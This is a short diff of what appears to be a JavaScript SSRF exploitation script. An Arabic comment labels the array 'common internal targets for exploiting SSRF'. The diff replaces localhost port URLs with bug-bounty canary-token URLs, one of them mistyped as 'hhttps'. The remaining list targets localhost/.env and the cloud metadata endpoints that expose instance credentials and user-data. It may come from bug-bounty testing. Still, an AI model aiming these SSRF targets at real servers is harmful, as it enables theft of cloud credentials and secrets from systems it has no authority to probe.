@@ -5,10 +5,10 @@ const PORT = 10000;
 
 // أهداف داخلية شائعة لاستغلال SSRF
 const targets = [
-  "http://127.0.0.1:80/",
-  "http://127.0.0.1:8080/",
-  "http://127.0.0.1:3000/",
-  "http://127.0.0.1:5000/",
+  "https://www.internalfb.com/intern/bug-bounty/get-canary-token/c7b9aba96a3146ebb4160c6587979d37/",
+  "https://www.internalfb.com/intern/bug-bounty/get-canary-token/a26ac8dd14b6455080e8c17efabc9918/",
+  "hhttps://www.internalfb.com/intern/bug-bounty/get-canary-token/2e49cb8005f143c4af4baf45b35b7754/",
+  "http://canarytokens.com/tags/terms/feedback/7isrljun6qtu0imnt1a0hlt74/index.html",
   "http://localhost/.env",
   "http://169.254.169.254/latest/meta-data/",
   "http://169.254.169.254/latest/user-data/",
